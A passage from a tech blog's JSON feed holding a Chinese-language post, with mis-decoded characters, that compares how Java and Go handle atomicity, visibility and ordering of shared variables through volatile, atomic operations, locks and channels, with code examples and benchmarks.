class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">incrementAndGet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">AtomicInteger</span> i <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Java å¦‚ä½•å¯¦ä½œ happen-beforeï¼Ÿ</h2>\n<p>Java æä¾›äº† volatile é—œéµå­—ç”¨ä¾†è™•ç† happen beforeï¼Œä¸€ä½†è®Šæ•¸åœ¨å®£å‘Šæ™‚åŠ ä¸Š volatileï¼Œå°è©²è®Šæ•¸çš„å­˜å–å³ä¿è­‰å¯è¦‹æ€§å’Œæœ‰åºæ€§ï¼ˆæ³¨æ„ï¼ŒåŸå­æ€§ä¸åœ¨ä¿è­‰å…§ï¼‰ã€‚ä»¥ä¸‹ä¾¿æ˜¯å°‡é–‹é ­è¬›çš„å…©å€‹å¯è¦‹æ€§å’Œæœ‰åºæ€§çš„ä¾‹å­ï¼Œä½¿ç”¨ volatile é—œéµå­—å®£å‘Šå…±æœ‰è®Šæ•¸ï¼Œä¾¿å¯ä»¥ä¿è­‰ happen-beforeã€‚</p>\n<p>ä»¥é–‹é ­ç¬¬äºŒå€‹å¯è¦‹æ€§çš„ä¾‹å­ä¾†èªªï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">boolean</span>  bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç•¶ flag ä½¿åƒæ•¸ä½¿ç”¨ volatile ä¿®é£¾å¾Œï¼Œthread t1 æœƒé¦¬ä¸Šæ„ŸçŸ¥åˆ° thread t2 åœ¨ç¬¬ 12 è¡Œå° flag çš„ç•°å‹•ï¼Œåˆ° main memory è®€å–æœ€æ–°çš„å€¼ï¼Œç„¶å¾Œé€ƒé›¢è¿´åœˆã€‚</p>\n<p>è€Œä»¥æœ‰åºæ€§çš„ä¾‹å­ä¾†çœ‹ volatileï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>åŠ å…¥ a, b å…©å€‹è®Šæ•¸åŠ å…¥ volatile ä¿®é£¾å¾Œï¼Œå³å¯ç¢ºä¿ a ä¹‹å‰çš„ code ä¸€å®šæœƒåœ¨ a ä¹‹å‰åŸ·è¡Œï¼Œb ä¹‹å‰çš„ code ä¸€å®šæœƒåœ¨ b ä¹‹å‰åŸ·è¡Œï¼Œå› æ­¤ thread t1 çš„ CPU æŒ‡ä»¤æœƒä¿è­‰åŸ·è¡Œé †åºä¸€å®šæ˜¯ a=2, b=1ã€‚è€Œå° main thread è€Œè¨€ï¼Œå°±æ°¸é ä¸æœƒçœ‹åˆ° b=1, a=0 é€™ç¨®äº‚åºè¡Œç‚ºäº†ã€‚</p>\n<h1 id=\"golang\"><a class=\"direct-link\" href=\"#golang\">#</a> Golang</h1>\n<h2 id=\"golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Golang å¦‚ä½•è™•ç†åŸå­æ€§ï¼Ÿ</h2>\n<p>Golang ä¹Ÿæœ‰æä¾›è‡ªå·±çš„ atomic tool kitï¼Œé‚„è¨˜å¾—æœ€é–‹é ­ä½¿ç”¨ Lock çš„ Golang ç¯„ä¾‹å—? å¯ä»¥æ”¹æˆç”¨ atomic ä¾†è™•ç†å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkFib10</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token function\">int64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tatomic<span class=\"token punctuation\">.</span><span class=\"token function\">AddInt64</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å¯ä»¥ç”¨ atomic æ›¿æ›æ‰ Lockï¼ŒåŒæ™‚é”åˆ°åŸå­æ€§æ•ˆæœã€‚</p>\n<p>é™„ä¸Šå…©ç¨®å¯«æ³•çš„ benchmark:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">BenchmarkLock-8 <span class=\"token number\">9266</span> <span class=\"token number\">134075</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op  <br>BenchmarkAtomic-8 <span class=\"token number\">19225</span> <span class=\"token number\">62309</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op</code></pre>\n<p>ç›¸è¼ƒä¹‹ä¸‹å¯ä»¥çœ‹åˆ° Lock çš„ç¢ºå¾ˆåƒæ•ˆèƒ½ã€‚ä¸‹åœ–é™„ä¸Šå° atomic ç¯„ä¾‹çš„ profiling</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png\" alt=\"\"></p>\n<p>å¯ä»¥çœ‹åˆ° cpu ä¸¦æ²’æœ‰èŠ±å¤ªå¤šæ™‚é–“åœ¨è™•ç†åŒæ­¥ä¸Šã€‚</p>\n<h2 id=\"golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Golang å¦‚ä½•å¯¦ä½œ happen-beforeï¼Ÿ</h2>\n<p>æ ¹æ“š Golang <a href=\"https://golang.org/ref/mem\">å®˜æ–¹ blog</a> èªªæ˜äº†ä¸‹é¢å¹¾ç¨®æƒ…æ³ Golang ä¿è­‰ happen beforeï¼š</p>\n<ul>\n<li>Initialization</li>\n<li>Goroutine creation</li>\n<li>Goroutine destruction</li>\n<li>Channel communication</li>\n<li>Locks</li>\n<li>Once</li>\n</ul>\n<p>ä½†ç¾ä¸­ä¸è¶³çš„æ˜¯ Golang ä¸¦æ²’æœ‰åƒ Java çš„ volatile å¯ä»¥ä¿è­‰æŸå€‹è®Šæ•¸çš„ happen beforeã€‚</p>\n<p>å·²å¯è¦‹æ€§ä¾†èªªï¼Œä¸‹é¢é€™æ®µ code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">continue</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Never end\\n\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç¬¬ 5~10 è¡Œçš„ goroutine æœƒå¡åœ¨ç„¡çª®è¿´åœˆã€‚</p>\n<p>å†èªªæœ‰åºæ€§ï¼Œ<a href=\"https://golang.org/ref/mem\">å®˜ç¶² blog</a> å³æœ‰æåˆ°ä¸‹é¢é€™æ®µ code ä¸æ˜¯å®‰å…¨çš„ concurrncy code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>\tb <span class=\"token operator\">=</span> <span class=\"token number\">2</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™æ®µ code æ˜¯æœ‰å¯èƒ½å…ˆ print 2 å† print 0ï¼Œå› æ­¤è·¨ goroutine çš„å…±æœ‰è®Šæ•¸ä½¿ç”¨æ™‚ï¼Œè‹¥é‡åˆ°é¡ä¼¼ä¸Šè¿°çš„ codeï¼Œå‹™å¿…è¦ç”¨ lock ç­‰æœ‰ä¿è­‰ happen before çš„æ©Ÿåˆ¶ä¿è­·ã€‚</p>\n<p>ç‚ºäº†ç¢ºä¿æœ‰åºæ€§å’Œå¯è¦‹æ€§ï¼Œè‹¥çœŸéœ€è¦å…±äº«è®Šæ•¸é‚„æ˜¯å¿…é ˆåœ¨è®Šæ•¸å‰å¾Œç”¨ç¬¨é‡çš„ Lock ä¿è­·ã€‚ä½†é«˜æ•ˆçš„ Golang æ€éº¼æœƒç”¨é€™éº¼ä½æ•ˆçš„è§£æ³•ï¼Ÿ</p>\n<p>åœ¨é€™ç¯‡<a href=\"https://blog.golang.org/codelab-share\">å®˜ç¶²çš„ blog</a> ä¸­æˆ‘å€‘æˆ–è¨±å¯ä»¥æ‰¾åˆ°æ›´é©åˆ Golang çš„è§£æ³•ã€‚æ–‡ç« ä¸­æåˆ°</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>é€™ä¹Ÿæ˜¯ Golang è¨­è¨ˆ concurrency model çš„åˆè¡·ï¼Œä½¿ç”¨ <a href=\"https://zh.wikipedia.org/wiki/%E4%BA%A4%E8%AB%87%E5%BE%AA%E5%BA%8F%E7%A8%8B%E5%BC%8F\">CSP model</a>ã€‚å› æ­¤æˆ‘èªç‚ºç”¨ channel ä¾†è™•ç†å¯è¦‹æ€§å’Œæœ‰åºæ€§çš„å•é¡Œæˆ–è¨±æ˜¯æ¯”è¼ƒ Golang çš„åšæ³•ï¼ˆå¦‚æœä½ é‚„æœ‰å°è±¡çš„è©±ï¼ŒGolang åœ¨ channel çš„æºé€šæ˜¯æœ‰ä¿è­‰ happen-before çš„ï¼‰ã€‚</p>\n<p>å¦‚å¯è¦‹æ€§ç¯„ä¾‹å¯ä»¥ç”¨ chan åœ¨ä¸åŒçš„ goroutine é–“å‚³é flag çš„å€¼ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> flag <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">break</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End of goroutine\\n\"</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tdone <span class=\"token operator\">&lt;-</span> <span class=\"token boolean\">false</span><br>\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>è€Œæœ‰åºæ€§ç¯„ä¾‹ä¹Ÿå¯ä»¥ç”¨ chan ä¾†å‚³é a, b çš„å€¼ï¼Œå› æ­¤å¯«èµ·ä¾†å¯èƒ½æœƒåƒä¸‹é¢é€™æ®µ code</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tchana <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\tchanb <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chana<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chanb<span class=\"token punctuation\">)</span><br><br>\t\tchana <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1</span><br>\t\tchanb <span class=\"token operator\">&lt;-</span> <span class=\"token number\">2</span><br>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">return</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">return</span> chana<span class=\"token punctuation\">,</span> chanb<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tchana<span class=\"token punctuation\">,</span> chanb <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chana<br>\tb <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chanb<br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h1 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h1>\n<p>æ’°å¯« concurrency çš„ç¨‹å¼æœ€å›°é›£çš„åœ°æ–¹æ˜¯ï¼Œå¾ˆå¤š bug éƒ½æ˜¯ä¸ç¢ºå®šçš„ï¼Œç„¡æ³•è¤‡è£½çš„ï¼Œé€™åŠ å¤§äº† debug çš„é›£åº¦ã€‚</p>\n<p>æ·±å…¥ç­è§£ concurrency çš„è­°é¡Œï¼Œä»¥åŠä½ å¯«çš„æ¯ä¸€è¡Œ code èƒŒå¾Œæ˜¯å¦‚ä½•é‹è¡Œçš„ï¼Œå¯ä»¥å¾ˆå¤§ç¨‹åº¦çš„å¹«åŠ©æˆ‘å€‘é¿å…åšéŒ¯äº‹ã€‚åŒæ™‚ï¼Œäº†è§£é€™äº›å¯ä»¥è®“æˆ‘å€‘æ›´é«”æœƒèªè¨€çš„è¨­è¨ˆç†å¿µï¼Œä¹Ÿèƒ½å¹«åŠ©æˆ‘å€‘æ›´å¥½çš„æ’°å¯«ç¬¦åˆè©²èªè¨€ç‰¹æ€§çš„å®‰å…¨é«˜æ•ˆ concurrency ç¨‹å¼ã€‚</p>\n",
      "date_published": "2021-05-03T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/",
      "title": "The Difference Between Java and Golang in  Writing Concurrent Code to Access Shared Variable",
